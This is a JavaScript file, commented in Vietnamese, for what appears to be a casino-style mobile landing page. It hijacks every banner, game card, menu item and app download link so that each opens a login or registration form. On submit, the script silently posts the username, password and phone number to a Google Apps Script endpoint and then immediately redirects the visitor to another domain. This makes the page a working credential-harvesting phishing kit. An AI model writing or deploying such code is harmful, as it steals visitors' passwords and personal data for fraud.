document.addEventListener('DOMContentLoaded', function () {
    
    // =========================================
    // 1. KHỞI TẠO SWIPER CHO BANNER
    // =========================================
    const bannerSwiper = new Swiper('.banner-swiper', {
        loop: true,
        autoplay: {
            delay: 3000,
            disableOnInteraction: false,
        },
        pagination: {
            el: '.swiper-pagination',
            clickable: true,
        },
        speed: 800, 
    });

    // =========================================
    // 2. XỬ LÝ MODAL ĐĂNG KÝ / ĐĂNG NHẬP
    // =========================================
    const modalOverlay = document.getElementById('auth-modal-overlay');
    const closeModalBtn = document.getElementById('close-modal-btn');
    
    // Nút chính
    const btnRegisterOpen = document.querySelector('.btn-register');
    const btnLoginOpen = document.querySelector('.btn-login');

    const tabRegister = document.getElementById('tab-register');
    const tabLogin = document.getElementById('tab-login');
    const formRegister = document.getElementById('form-register');
    const formLogin = document.getElementById('form-login');

    // Hàm mở Modal 
    function openModal(isLogin) {
        modalOverlay.classList.remove('hidden');
        if (isLogin) {
            tabLogin.click();
        } else {
            tabRegister.click();
        }
    }

    // Hàm đóng Modal
    function closeModal() {
        modalOverlay.classList.add('hidden');
    }

    // Gắn sự kiện cho 2 nút Đăng ký / Đăng nhập chính
    if (btnRegisterOpen) btnRegisterOpen.addEventListener('click', () => openModal(false));
    if (btnLoginOpen) btnLoginOpen.addEventListener('click', () => openModal(true));

    // ---------------------------------------------------------
    // BỔ SUNG MỚI: BẤM CÁC THÀNH PHẦN KHÁC ĐỀU MỞ FORM ĐĂNG NHẬP
    // ---------------------------------------------------------
    // Gom tất cả các khối có thể click trên trang web
    const otherClickableElements = document.querySelectorAll(`
        .swiper-slide,       /* Banner */
        .link-item,          /* 4 icon Tải app, Tin tức... */
        .game-cat-item,      /* Cuộn menu Casino, Bắn cá... */
        .game-card,          /* 6 Game Hot */
        .btn-outline-red,    /* Nút tải app iOS/Android */
        .dl-store-img,       /* Ảnh App Store / Google Play */
        .nav-item            /* Menu dưới cùng (Bottom Nav) */
    `);

    // Duyệt qua từng phần tử và gắn sự kiện click
    otherClickableElements.forEach(element => {
        element.addEventListener('click', (e) => {
            e.preventDefault(); // Ngăn chặn chuyển trang nếu là thẻ <a>
            openModal(true);    // true = Mở tab Đăng Nhập
        });
    });
    // ---------------------------------------------------------

    // Đóng Modal khi bấm nút X hoặc bấm ra vùng nền đen
    if (closeModalBtn) closeModalBtn.addEventListener('click', closeModal);
    modalOverlay.addEventListener('click', function(e) {
        if (e.target === modalOverlay) closeModal();
    });

    // Chuyển đổi Tab
    tabRegister.addEventListener('click', () => {
        tabRegister.classList.add('active');
        tabLogin.classList.remove('active');
        formRegister.classList.remove('hidden');
        formLogin.classList.add('hidden');
    });

    tabLogin.addEventListener('click', () => {
        tabLogin.classList.add('active');
        tabRegister.classList.remove('active');
        formLogin.classList.remove('hidden');
        formRegister.classList.add('hidden');
    });

    // Ẩn/hiện mật khẩu
    const togglePasswordIcons = document.querySelectorAll('.toggle-pw');
    togglePasswordIcons.forEach(icon => {
        icon.addEventListener('click', function () {
            const input = this.previousElementSibling;
            if (input.type === 'password') {
                input.type = 'text';
                this.classList.replace('fa-eye-slash', 'fa-eye');
            } else {
                input.type = 'password';
                this.classList.replace('fa-eye', 'fa-eye-slash');
            }
        });
    });

    // =========================================
    // 3. KIỂM TRA RÀNG BUỘC VÀ CHUYỂN HƯỚNG
    // =========================================
    
    // ĐIỀN LINK WEB APP URL CỦA BẠN VÀO ĐÂY:
    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxS-6COnVgxsynjwtbcrmJFP0QbGoWMutndAlnVek97UIgtbeni29jz9XuUyyx3Lksk/exec';

    function validateForm(form) {
        const requiredInputs = form.querySelectorAll('input[required]');
        for (let input of requiredInputs) {
            const val = input.value.trim();
            if (!val) {
                if (input.type === 'checkbox' && !input.checked) {
                    alert('Bạn phải đồng ý với thỏa thuận đăng ký người dùng!');
                    return false;
                } else if (input.type !== 'checkbox') {
                    alert('Vui lòng điền đầy đủ các thông tin bắt buộc!');
                    input.focus();
                    return false;
                }
            }
            if (input.placeholder.toLowerCase().includes('tên đăng nhập') && (val.length < 6 || val.length > 20)) {
                alert('Tên đăng nhập phải từ 6 đến 20 ký tự!');
                input.focus();
                return false;
            }
            if (input.placeholder.toLowerCase().includes('mật khẩu') && (val.length < 6 || val.length > 20)) {
                alert('Mật khẩu phải từ 6 đến 20 ký tự!');
                input.focus();
                return false;
            }
            if (input.placeholder.toLowerCase().includes('số điện thoại')) {
                const phoneRegex = /^[0-9]{10}$/;
                if (!phoneRegex.test(val)) {
                    alert('Số điện thoại không hợp lệ! Vui lòng nhập chính xác 10 chữ số.');
                    input.focus();
                    return false;
                }
            }
        }
        return true;
    }

    function sendDataToSheetAndRedirect(form, formType, submitBtn) {
        // Vô hiệu hóa nút và đổi chữ trong lúc chờ gửi để tránh spam click
        submitBtn.innerHTML = 'ĐANG XỬ LÝ...';
        submitBtn.disabled = true;

        const formData = new FormData(form);
        formData.append('type', formType); 

        const data = new URLSearchParams();
        for (const pair of formData) {
            data.append(pair[0], pair[1]);
        }

        // 1. GỬI DỮ LIỆU ĐI (Bắn và Quên)
        fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors', 
            keepalive: true, // QUAN TRỌNG: Lệnh này yêu cầu trình duyệt tiếp tục gửi dữ liệu ngầm kể cả khi người dùng đã chuyển sang trang web khác
            body: data
        }).catch(error => console.error('Lỗi gửi ngầm:', error));

        // 2. CHUYỂN HƯỚNG NGAY LẬP TỨC
        // Sử dụng một độ trễ rất nhỏ (300ms) để người dùng kịp nhìn thấy chữ "ĐANG XỬ LÝ..." 
        // và trình duyệt có đủ 1 nhịp để khởi tạo kết nối mạng trước khi rời đi.
        setTimeout(() => {
            window.location.href = "https://m.mbaac.cc/";
        }, 300); 
    }

    // Submit Đăng Ký
    const btnSubmitRegister = formRegister.querySelector('.submit-btn');
    if (btnSubmitRegister) {
        btnSubmitRegister.addEventListener('click', function(e) {
            e.preventDefault(); 
            if(validateForm(formRegister)) {
                sendDataToSheetAndRedirect(formRegister, 'ĐĂNG KÝ', btnSubmitRegister);
            }
        });
    }

    // Submit Đăng Nhập
    const btnSubmitLogin = formLogin.querySelector('.submit-btn');
    if (btnSubmitLogin) {
        btnSubmitLogin.addEventListener('click', function(e) {
            e.preventDefault(); 
            if(validateForm(formLogin)) {
                sendDataToSheetAndRedirect(formLogin, 'ĐĂNG NHẬP', btnSubmitLogin);
            }
        });
    }
});